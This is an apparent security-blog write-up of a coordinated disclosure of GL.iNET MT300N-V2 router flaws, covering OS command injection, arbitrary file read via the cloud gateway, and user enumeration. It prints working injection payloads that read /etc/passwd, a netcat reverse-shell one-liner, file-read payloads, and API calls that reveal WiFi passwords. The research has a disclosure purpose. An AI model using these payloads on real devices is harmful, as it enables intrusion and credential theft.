<!DOCTYPE html>
<html lang="en">
<head>

    <title>Vulnerabilities and Hardware Teardown of GL.iNET MT300N-V2</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <link rel="preload" as="style" href="https://boschko.ca/assets/built/screen.css?v=4f517c742f" />
    <link rel="preload" as="script" href="https://boschko.ca/assets/built/casper.js?v=4f517c742f" />

    <link rel="stylesheet" type="text/css" href="https://boschko.ca/assets/built/screen.css?v=4f517c742f" />

    <meta name="description" content="GL.iNET router teardown. Discovered multiple vulnerabilities in the IoT hardware, application, &amp; cloud peripheral application.">
    <link rel="canonical" href="https://boschko.ca/glinet-router/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <link rel="amphtml" href="https://boschko.ca/glinet-router/amp/">
    
    <meta property="og:site_name" content="Boschko Security Blog">
    <meta property="og:type" content="article">
    <meta property="og:title" content="GL.iNET GL-MT300N-V2 Router Vulnerabilities and Hardware Teardown">
    <meta property="og:description" content="Discovered multiple vulnerabilities in the IoT hardware, software, &amp; cloud peripheral applications (CVE-2022-31898 CVE-2022-42055 CVE-2022-42054).">
    <meta property="og:url" content="https://boschko.ca/glinet-router/">
    <meta property="og:image" content="https://boschko.ca/content/images/size/w1200/2022/05/main-1.png">
    <meta property="article:published_time" content="2022-10-26T13:59:21.000Z">
    <meta property="article:modified_time" content="2024-11-25T22:14:47.000Z">
    <meta property="article:tag" content="Hardware Hacking">
    <meta property="article:tag" content="Web">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="GL.iNET GL-MT300N-V2 Router Vulnerabilities and Hardware Teardown">
    <meta name="twitter:description" content="Discovered multiple vulnerabilities in the IoT hardware, software, &amp; cloud peripheral applications (CVE-2022-31898 CVE-2022-42055 CVE-2022-42054).">
    <meta name="twitter:url" content="https://boschko.ca/glinet-router/">
    <meta name="twitter:image" content="https://boschko.ca/content/images/size/w1200/2022/05/main.png">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="Olivier Laflamme">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="Hardware Hacking, Web">
    <meta name="twitter:site" content="@olivier_boschko">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="843">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "Boschko Security Blog",
        "url": "https://boschko.ca/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://boschko.ca/content/images/2021/09/Capture.PNG"
        }
    },
    "author": {
        "@type": "Person",
        "name": "Olivier Laflamme",
        "image": {
            "@type": "ImageObject",
            "url": "https://boschko.ca/content/images/2021/09/119486535_632169284368147_173960549788702982_n-1.jpg",
            "width": 1080,
            "height": 1075
        },
        "url": "https://boschko.ca/author/olivier/",
        "sameAs": []
    },
    "headline": "Vulnerabilities and Hardware Teardown of GL.iNET MT300N-V2",
    "url": "https://boschko.ca/glinet-router/",
    "datePublished": "2022-10-26T13:59:21.000Z",
    "dateModified": "2024-11-25T22:14:47.000Z",
    "keywords": "Hardware Hacking, Web",
    "description": "Hacking GL.iNET MT300N router &amp; hardware teardown (3 CVEs).",
    "mainEntityOfPage": "https://boschko.ca/glinet-router/"
}
    </script>

    <meta name="generator" content="Ghost 5.105">
    <link rel="alternate" type="application/rss+xml" title="Boschko Security Blog" href="https://boschko.ca/rss/">
    <script defer src="https://cdn.jsdelivr.net/ghost/portal@~2.46/umd/portal.min.js" data-i18n="true" data-ghost="https://boschko.ca/" data-key="0ab6c89b32274048f7d9cc1298" data-api="https://boschko-security-blog.ghost.io/ghost/api/content/" data-locale="en" crossorigin="anonymous"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
.gh-post-upgrade-cta {
    display: flex;
    flex-direction: column;
    align-items: center;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    text-align: center;
    width: 100%;
    color: #ffffff;
    font-size: 16px;
}

.gh-post-upgrade-cta-content {
    border-radius: 8px;
    padding: 40px 4vw;
}

.gh-post-upgrade-cta h2 {
    color: #ffffff;
    font-size: 28px;
    letter-spacing: -0.2px;
    margin: 0;
    padding: 0;
}

.gh-post-upgrade-cta p {
    margin: 20px 0 0;
    padding: 0;
}

.gh-post-upgrade-cta small {
    font-size: 16px;
    letter-spacing: -0.2px;
}

.gh-post-upgrade-cta a {
    color: #ffffff;
    cursor: pointer;
    font-weight: 500;
    box-shadow: none;
    text-decoration: underline;
}

.gh-post-upgrade-cta a:hover {
    color: #ffffff;
    opacity: 0.8;
    box-shadow: none;
    text-decoration: underline;
}

.gh-post-upgrade-cta a.gh-btn {
    display: block;
    background: #ffffff;
    text-decoration: none;
    margin: 28px 0 0;
    padding: 8px 18px;
    border-radius: 4px;
    font-size: 16px;
    font-weight: 600;
}

.gh-post-upgrade-cta a.gh-btn:hover {
    opacity: 0.92;
}</style>
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.5/umd/sodo-search.min.js" data-key="0ab6c89b32274048f7d9cc1298" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.5/umd/main.css" data-sodo-search="https://boschko-security-blog.ghost.io/" data-locale="en" crossorigin="anonymous"></script>
    
    <link href="https://boschko.ca/webmentions/receive/" rel="webmention">
    <script defer src="/public/cards.min.js?v=4f517c742f"></script>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=4f517c742f">
    <script defer src="/public/member-attribution.min.js?v=4f517c742f"></script><style>:root {--ghost-accent-color: #000000;}</style>
    <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-209482797-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-209482797-1');
  gtag('set', {'user_id': 'USER_ID'}); // Set the user ID using signed-in user_id
</script>

<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-3GEFND46EZ"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-3GEFND46EZ');
</script>

</head>
<body class="post-template tag-hardware-hacking tag-web is-head-left-logo has-cover">
<div class="viewport">

    <header id="gh-head" class="gh-head outer">
        <div class="gh-head-inner inner">
            <div class="gh-head-brand">
                <a class="gh-head-logo" href="https://boschko.ca">
                        <img src="https://boschko.ca/content/images/2021/09/Capture.PNG" alt="Boschko Security Blog">
                </a>
                <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                <button class="gh-burger" aria-label="Main Menu"></button>
            </div>

            <nav class="gh-head-menu">
                <ul class="nav">
    <li class="nav-home"><a href="https://boschko.ca/">Home</a></li>
    <li class="nav-tags"><a href="https://boschko.ca/tags/">Tags</a></li>
    <li class="nav-about-boschko"><a href="https://boschko.ca/about/">About Boschko</a></li>
    <li class="nav-red-rain-security"><a href="https://boschko.ca/redrainsecurity/">Red Rain Security</a></li>
</ul>

            </nav>

            <div class="gh-head-actions">
                    <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                    <div class="gh-head-members">
                                <a class="gh-head-link" href="#/portal/signin" data-portal="signin">Sign in</a>
                                <a class="gh-head-button" href="#/portal/signup" data-portal="signup">Subscribe</a>
                    </div>
            </div>
        </div>
    </header>

    <div class="site-content">
        



<main id="site-main" class="site-main">
<article class="article post tag-hardware-hacking tag-web no-image ">

    <header class="article-header gh-canvas">

        <div class="article-tag post-card-tags">
                <span class="post-card-primary-tag">
                    <a href="/tag/hardware-hacking/">Hardware Hacking</a>
                </span>
        </div>

        <h1 class="article-title">Vulnerabilities and Hardware Teardown of GL.iNET GL-MT300N-V2 Router</h1>

            <p class="article-excerpt">Hacking GL.iNET MT300N router &amp; hardware teardown (3 CVEs).</p>

        <div class="article-byline">
        <section class="article-byline-content">

            <ul class="author-list instapaper_ignore">
                <li class="author-list-item">
                    <a href="/author/olivier/" class="author-avatar" aria-label="Read more of Olivier Laflamme">
                        <img class="author-profile-image" src="/content/images/size/w100/2021/09/119486535_632169284368147_173960549788702982_n-1.jpg" alt="Olivier Laflamme" />
                    </a>
                </li>
            </ul>

            <div class="article-byline-meta">
                <h4 class="author-name"><a href="/author/olivier/">Olivier Laflamme</a></h4>
                <div class="byline-meta-content">
                    <time class="byline-meta-date" datetime="2022-10-26">26 Oct 2022</time>
                        <span class="byline-reading-time"><span class="bull">&bull;</span> 32 min read</span>
                </div>
            </div>

        </section>
        </div>


    </header>

    <section class="gh-content gh-canvas">
        <p>I've really enjoyed reversing cheap/weird IoT devices in my free time. In early May of 2022, I went on an Amazon/AliExpress shopping spree and purchased ~15 cheap IoT devices. Among them was this mini portable router by <a href="https://www.gl-inet.com/?ref=boschko.ca">GL.iNET</a>.  </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-2.png" class="kg-image" alt="" loading="lazy" width="2000" height="956" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-2.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-2.png 1000w, https://boschko.ca/content/images/size/w1600/2022/05/image-2.png 1600w, https://boschko.ca/content/images/size/w2400/2022/05/image-2.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>GL.iNET is a leading developer of OpenWrt Wi-Fi and IoT network solutions and to my knowledge is a Chinese company based out in Hong Kong &amp; USA. They offer a wide variety of products, and the company’s official website is <a href="https://www.gl-inet.com/?ref=boschko.ca">www.gl-inet.com</a>. The GL-MT300N-V2 firmware version I dove into was <code>V3.212</code> released on April 29th, 2022 for the Mango model. The <a href="https://www.gl-inet.com/solutions/goodcloud/?ref=boschko.ca">goodcloud</a> remote cloud management gateway was <code>Version 1.00.220412.00</code>.</p><p>This blog will be separated into <u>two sections</u>. The first half contains software vulnerabilities, this includes the local web application and the remote cloud peripherals. The second mainly consists of an attempted hardware teardown.  </p><blockquote>I like to give credit where credit is due. The GL.iNET team was really awesome to work &amp; communicate with. They genuinely care about the security posture of their products. So I'd like to give some quick praise for being an awesome vendor that kept me in the loop throughout the patching/disclosure process.   </blockquote><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/07/image-10.png" class="kg-image" alt="" loading="lazy" width="498" height="280"></figure><p>In terms of overall timeline/transparency, I started testing on-and-off between <code>May 2nd 2022</code> to <code>June 15th 2022</code>. After reporting the initial command injection vulnerability GL.iNET asked if I were interested in monetary compensation to find additional bugs. We ultimately agreed to public disclosure &amp; the release of this blog in exchange for continued testing. As a result, I was given safe passage and continued to act in good faith. Lastly, the GL.iNet also shipped me their (<a href="https://www.gl-inet.com/products/gl-ax1800/?ref=boschko.ca">GL-AX1800 / Flint</a>) for additional testing. GL.iNet <u>does not</u> have a BBP or VDP program, I asked, and was given permission to perform the tests I did. In other words, think twice before poking at their infrastructure and being a nuisance. </p><hr><blockquote>Having vulnerabilities reported should <u>never</u> be seen as a defeat or failure. Development and security are intertwined in a never ending cycle. There will <u>always</u> be vulnerabilities in <u>all</u> products that take risks on creativity, innovation, and change - the essence of pioneering. </blockquote><hr><h3 id="vulnerabilities-list">Vulnerabilities List</h3><p>A total of 6 vulnerabilities were identified in GL.iNet routers and IoT cloud gateway peripheral web applications:</p><pre><code>1. OS command injection on router &amp; cloud gateway (CVE-2022-31898)
2. Arbitrary file read on router via cloud gateway (CVE-2022-42055)
3. PII data leakage via user enumeration leading to account takeover
4. Account takeover via stored cross-site scripting (CVE-2022-42054)
5. Account takeover via weak password requirements &amp; lack of rate limiting
6. Password policy bypass leading to single character passwords </code></pre><hr><h2 id="web-application"><strong>Web Application </strong></h2><h3 id="os-command-injection"><strong>OS Command Injection </strong></h3><p>The MT300N-V2 portable router is affected by an OS Command Injection vulnerability that allows authenticated attackers to run arbitrary commands on the affected system as the application's user. This vulnerability exists within the local web interface and remote cloud interface. This vulnerability stems from improper validation of input passed through the ping (<code>ping_addr</code>) and traceroute (<code>trace_addr</code>) parameters. The vulnerability affects <strong><u>ALL </u></strong>GL.iNET product's firmware  <code>&gt;3.2.12</code>.</p><p>Fixed in firmware <code>Version 3.215</code> stable build <code>SHA256: 8d761ac6a66598a5b197089e6502865f4fe248015532994d632f7b5757399fc7</code></p><h3 id="vulnerability-details">Vulnerability Details</h3><pre><code>CVE ID: CVE-2022-31898
Access Vector: Remote/Adjacent
Security Risk: High
Vulnerability: CWE-78
CVSS Base Score: 8.4
CVSS Vector: CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H</code></pre><p>I'll run through the entire discovery process. There exists a file on disk <code>/www/src/router/router.js</code> which essentially manages the application panels. Think of it as the endpoint reference in charge of calling different features and functionality. As seen below, the path parameter points to the endpoint containing the router feature's location on disk. When the endpoint such as <code>/attools</code> is fetched its respective <code>.js</code>, <code>.html</code>, and <code>.css</code> files are loaded onto the page.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-22.png" class="kg-image" alt="" loading="lazy" width="1900" height="730" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-22.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-22.png 1000w, https://boschko.ca/content/images/size/w1600/2022/05/image-22.png 1600w, https://boschko.ca/content/images/2022/05/image-22.png 1900w" sizes="(min-width: 720px) 720px"></figure><p>Through this endpoint, I quickly discovered that a lot of these panels were not actually accessible through the web UI's sidebar seen below. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-17.png" class="kg-image" alt="" loading="lazy" width="571" height="726"></figure><p>However, the functionality of these endpoints existed and were properly configured &amp; referenced. Visually speaking, within the application they don't have a sidebar "button" or action that can redirect us to it. </p><p>Here is a full list of endpoints that can not be accessed through web UI actions. </p><pre><code>http://192.168.8.1/#/ping    &lt;-------- Vulnerable
http://192.168.8.1/#/apitest
http://192.168.8.1/#/attools
http://192.168.8.1/#/smessage
http://192.168.8.1/#/sendmsg
http://192.168.8.1/#/gps
http://192.168.8.1/#/cells
http://192.168.8.1/#/siderouter
http://192.168.8.1/#/rs485
http://192.168.8.1/#/adguardhome
http://192.168.8.1/#/sms
http://192.168.8.1/#/log
http://192.168.8.1/#/process
http://192.168.8.1/#/blelist
http://192.168.8.1/#/bluetooth</code></pre><p>I should mention that some of these endpoints do become available after connecting modems, and other peripheral devices to the router. See the documentation for more details <a href="https://docs.gl-inet.com/?ref=boschko.ca">https://docs.gl-inet.com/</a>.</p><p>As seen above, there exists a <code>ping</code> endpoint. From experience, these are always interesting. This endpoint has the ability to perform typical <code>ping</code> and <code>traceroute</code> commands. Let's quickly confirm that these files exist, <code>/ping</code> actions get called as defined within the <code>router.js</code> file.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-16.png" class="kg-image" alt="" loading="lazy" width="800" height="110" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-16.png 600w, https://boschko.ca/content/images/2022/05/image-16.png 800w" sizes="(min-width: 720px) 720px"></figure><p>The expected usage and output can be seen below. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-19.png" class="kg-image" alt="" loading="lazy" width="1812" height="1166" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-19.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-19.png 1000w, https://boschko.ca/content/images/size/w1600/2022/05/image-19.png 1600w, https://boschko.ca/content/images/2022/05/image-19.png 1812w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-18.png" class="kg-image" alt="" loading="lazy" width="2000" height="514" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-18.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-18.png 1000w, https://boschko.ca/content/images/size/w1600/2022/05/image-18.png 1600w, https://boschko.ca/content/images/size/w2400/2022/05/image-18.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>What's OS Command Injection? OS command injection is a fairly common vulnerability seen in such endpoints. Its typically exploited by using command operators ( <code>|</code> ,<code>&amp;&amp;</code>, <code>;</code>, etc,) that would allow you to execute multiple commands in succession, regardless of whether each previous command succeeds. </p><p>Looking back at the ping portal, the UI (frontend) sanitizes the user-provided input against the following regex which is a very common implementation for validating IPv4 addresses.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/08/image-139.png" class="kg-image" alt="" loading="lazy" width="2000" height="296" srcset="https://boschko.ca/content/images/size/w600/2022/08/image-139.png 600w, https://boschko.ca/content/images/size/w1000/2022/08/image-139.png 1000w, https://boschko.ca/content/images/size/w1600/2022/08/image-139.png 1600w, https://boschko.ca/content/images/2022/08/image-139.png 2082w" sizes="(min-width: 720px) 720px"></figure><p>Therefore, <code>;</code> isn't an expected IPv4 schema character so when the <code>pingIP()</code> check is performed, and any invalid characters will fail the request.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/08/image-141.png" class="kg-image" alt="" loading="lazy" width="1210" height="274" srcset="https://boschko.ca/content/images/size/w600/2022/08/image-141.png 600w, https://boschko.ca/content/images/size/w1000/2022/08/image-141.png 1000w, https://boschko.ca/content/images/2022/08/image-141.png 1210w" sizes="(min-width: 720px) 720px"></figure><p>And we're presented with the following error message. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-9.png" class="kg-image" alt="" loading="lazy" width="1338" height="684" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-9.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-9.png 1000w, https://boschko.ca/content/images/2022/05/image-9.png 1338w" sizes="(min-width: 720px) 720px"></figure><p>We need to feed malicious content into the parameter <code>pingValue</code>. If we do this successfully and don't fail the check, our request will be sent to the web server where the server application act upon the input.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/08/image-142.png" class="kg-image" alt="" loading="lazy" width="381" height="229"></figure><p>To circumvent the input sanitization on the front-end we will send our post request to the webserver directly using Burp Suite. This way we can simply modify the POST request without the front-end sanitization being forced. As mentioned above, using the <code>;</code> command separator we should be able to achieve command injection through the <code>ping_addr</code> or <code>trace_addr</code> parameters. If I've explained this poorly, perhaps the following visual can help. </p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://boschko.ca/content/images/2022/08/image-137.png" class="kg-image" alt="" loading="lazy" width="1854" height="760" srcset="https://boschko.ca/content/images/size/w600/2022/08/image-137.png 600w, https://boschko.ca/content/images/size/w1000/2022/08/image-137.png 1000w, https://boschko.ca/content/images/size/w1600/2022/08/image-137.png 1600w, https://boschko.ca/content/images/2022/08/image-137.png 1854w" sizes="(min-width: 720px) 720px"><figcaption><span style="white-space: pre-wrap;">Image Credit: </span><a href="https://www.youtube.com/watch?v=sXiGknzD02c&ref=boschko.ca"><span style="white-space: pre-wrap;">I‘m on Your Phone, Listening – Attacking VoIP Configuration Interfaces</span></a></figcaption></figure><p>Let's give it a try. If you look closely at the POST request below the <code>ping_addr</code> value is <code>;/bin/pwd%20</code> which returned the present working directory of the application user. Confirming that OS Command Injection had been successfully performed. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-7.png" class="kg-image" alt="" loading="lazy" width="2000" height="618" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-7.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-7.png 1000w, https://boschko.ca/content/images/size/w1600/2022/05/image-7.png 1600w, https://boschko.ca/content/images/size/w2400/2022/05/image-7.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>Now let's do an obligatory cat of <code>/etc/passwd</code> by feeding the following input <code>;/bin/cat /etc/passwd 2&gt;&amp;1</code></p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-10.png" class="kg-image" alt="" loading="lazy" width="2000" height="630" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-10.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-10.png 1000w, https://boschko.ca/content/images/size/w1600/2022/05/image-10.png 1600w, https://boschko.ca/content/images/2022/05/image-10.png 2322w" sizes="(min-width: 720px) 720px"></figure><p>Okay, let's go ahead and get a reverse shell. </p><pre><code>Payload: 
;rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|/usr/bin/nc 192.168.8.193 4000 &gt;/tmp/f

URL encoded:
;rm%20/tmp/f;mknod%20/tmp/f%20p;cat%20/tmp/f|/bin/sh%20-i%202%3E%261|/usr/bin/nc%20192.168.8.193%204000%20&gt;%20tmp%20f</code></pre><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-12.png" class="kg-image" alt="" loading="lazy" width="2000" height="642" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-12.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-12.png 1000w, https://boschko.ca/content/images/size/w1600/2022/05/image-12.png 1600w, https://boschko.ca/content/images/size/w2400/2022/05/image-12.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>Cool, but this attack scenario kinda sucks... we need to be authenticated, on the same network, etc, etc. One of the main reasons I think this is a cool find, and why it's <u>not</u> simply a local attack vector is that we can configure our device with the vendor's IoT cloud gateway! This cloud gateway allows us to deploy and manage our connected IoT gateways remotely.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-71.png" class="kg-image" alt="" loading="lazy" width="969" height="640" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-71.png 600w, https://boschko.ca/content/images/2022/05/image-71.png 969w" sizes="(min-width: 720px) 720px"></figure><p>I've discovered that there are roughly <code>~30000</code> devices configured this way. One of the features of this cloud management portal is the ability to access your device's admin panel remotely through a public-facing endpoint. Such can be seen below. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-73.png" class="kg-image" alt="" loading="lazy" width="778" height="228" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-73.png 600w, https://boschko.ca/content/images/2022/05/image-73.png 778w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-70.png" class="kg-image" alt="" loading="lazy" width="940" height="606" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-70.png 600w, https://boschko.ca/content/images/2022/05/image-70.png 940w" sizes="(min-width: 720px) 720px"></figure><p>As you may have guessed, command injection could be performed from this endpoint as well. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-72.png" class="kg-image" alt="" loading="lazy" width="1245" height="483" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-72.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-72.png 1000w, https://boschko.ca/content/images/2022/05/image-72.png 1245w" sizes="(min-width: 720px) 720px"></figure><p>In theory, any attacker with the ability to <u>hijack goodcloud.xyz user sessions</u> or <u>compromise a user account</u> (<strong><em>both achieved in this blog</em></strong>) could potentially leverage this attack vector to gain a foothold on a network compromise. </p><p>Additional things you can do:</p><pre><code>Scan internal network:
GET /cgi-bin/api/repeater/scan

Obtain WiFi password of joined SSID's
GET /cgi-bin/api/repeater/manager/list

Obtain WiFi password of routers SSID's
GET /cgi-bin/api/ap/info </code></pre><h3 id="disclosure-timeline">Disclosure Timeline </h3><p>May 2, 2022: Initial discovery<br>
May 2, 2020: Vendor contacted<br>
May 3, 2022: Vulnerability reported to the vendor<br>
May 10, 2022: Vulnerability confirmed by the vendor<br>
July 6, 2022: CVE reserved<br>
July 7, 2022: Follow up with the vendor<br>
October 13, 2022: Fixed in firmware 3.215</p>
<hr><h2 id="arbitrary-file-read">Arbitrary File Read</h2><p>The MT300N-V2 portable router, configured along sides the vendor's <a href="https://docs.gl-inet.com/en/3/tutorials/cloud/?ref=boschko.ca">cloud management</a> gateway (goodcloud.xyz) is vulnerable to Arbitrary File Read. The remote cloud gateway is intended to facilitate remote device access and management. This vulnerability exists within the cloud manager web interface and is only a feature available to enterprise users. The device editing interface tools harbors the <code>ping</code> and <code>traceroute</code> functionality which is vulnerable to a broken type of command injection whose behavior is limited to performing arbitrary file reads. Successful exploitation of this vulnerability will allow an attacker to access sensitive files and data on the router. It is possible to read any arbitrary files on the file system, including application source code, configuration, and other critical system files. </p><h3 id="vulnerability-details-1">Vulnerability Details</h3><pre><code>CVE ID: CVE-2022-42055
Access Vector: Remote
Security Risk: Medium
Vulnerability: CWE-23 &amp; CWE-25
CVSS Base Score: 6.5
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</code></pre><p>Enterprise users will have the <code>TOOLS</code> menu when editing their devices as seen below. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/10/image-109.png" class="kg-image" alt="" loading="lazy" width="1377" height="754" srcset="https://boschko.ca/content/images/size/w600/2022/10/image-109.png 600w, https://boschko.ca/content/images/size/w1000/2022/10/image-109.png 1000w, https://boschko.ca/content/images/2022/10/image-109.png 1377w" sizes="(min-width: 720px) 720px"></figure><p>The <code>ping_addr</code> and <code>trace_addr</code> both allow you to read any file on disk when prepending <code>;/bin/sh</code> to the file you want to read.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/09/image-151.png" class="kg-image" alt="" loading="lazy" width="899" height="349" srcset="https://boschko.ca/content/images/size/w600/2022/09/image-151.png 600w, https://boschko.ca/content/images/2022/09/image-151.png 899w" sizes="(min-width: 720px) 720px"></figure><p>I'm not sure why this happens. I have not been able to get regular command injection due to the way its calling <code>ping</code> and <code>traceroute</code> within busybox from what I assume is data passing through something similar to a ngrok tunnel. I can't use funky delimiters or common escapes to simply comment out the rest of the operation. Anyhow, valid payloads would look like the following:</p><pre><code>;bin/sh%20/&lt;PATH_TO_FILE&gt;

&amp;bin/sh%20/&lt;PATH_TO_FILE&gt;</code></pre><p>As a POC I've created a <code>flag.txt</code> file in <code>/tmp</code> on my router and I'm going to read it from the cloud gateway. I could just as easily read the <code>passwd</code> and <code>shadow</code> files. Successfully cracking them offline would allow me access to both the cloud ssh terminal, and the login UI.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/10/image-107.png" class="kg-image" alt="" loading="lazy" width="1178" height="469" srcset="https://boschko.ca/content/images/size/w600/2022/10/image-107.png 600w, https://boschko.ca/content/images/size/w1000/2022/10/image-107.png 1000w, https://boschko.ca/content/images/2022/10/image-107.png 1178w" sizes="(min-width: 720px) 720px"></figure><p>Funny enough, this action can then be seen getting processed by the logs on the cloud gateway. So definitely not "OPSEC" friendly.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-171.png" class="kg-image" alt="" loading="lazy" width="2000" height="570" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-171.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-171.png 1000w, https://boschko.ca/content/images/size/w1600/2022/05/image-171.png 1600w, https://boschko.ca/content/images/size/w2400/2022/05/image-171.png 2400w" sizes="(min-width: 720px) 720px"></figure><h3 id="disclosure-timeline-1">Disclosure Timeline </h3><p>May 25, 2022: Initial discovery<br>
May 25, 2022: Vendor contacted &amp; vulnerability reported<br>
May 26, 2022: Vendor confirms vulnerability<br>
July 7, 2022: Follow up with the vendor<br>
October 13, 2022: Fixed in firmware 3.215</p>
<hr><h3 id="pii-data-leakage-user-enumeration"><strong>PII Data Leakage &amp; User Enumeration </strong></h3><p>The MT300N-V2 portable router has the ability to be configured along sides the vendor's <a href="https://docs.gl-inet.com/en/3/tutorials/cloud/?ref=boschko.ca">cloud management</a> gateway (goodcloud.xyz) which allows for remote access and management.  This vulnerability exists within the cloud manager web interface through the device-sharing endpoint <code>cloud-api/cloud/user/get-user?nameoremail=</code> GET request.  Successful enumeration of a user will result in that user's PII information being disclosed. At its core, this is a funky IDOR. The vulnerability affected the goodcloud.xyz prior to May, 12th 2022. </p><h3 id="vulnerability-details-2">Vulnerability Details</h3><pre><code>CVE ID: N/A
Access Vector: Network
Security Risk: Medium
Vulnerability: CWE-200 &amp; CWE-203
CVSS Base Score: 6.5
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</code></pre><p>I identified roughly  <code>~30,000</code> users which were enumerated via their username or email address. Successful enumeration compromises the confidentiality of the user. This vulnerability returns sensitive information that could be leveraged by a sophisticated, and motivated attacker to compromise the user's account credentials. </p><p>This attack is performed after creating a regular <code>goodcloud.xyz</code> cloud gateway account and linking your GL.iNet device. In the image below we see that our device can be shared with another registered user. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-54.png" class="kg-image" alt="" loading="lazy" width="1579" height="814" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-54.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-54.png 1000w, https://boschko.ca/content/images/2022/05/image-54.png 1579w" sizes="(min-width: 720px) 720px"></figure><p>The request and response for sharing a device with another user are seen below.</p><figure class="kg-card 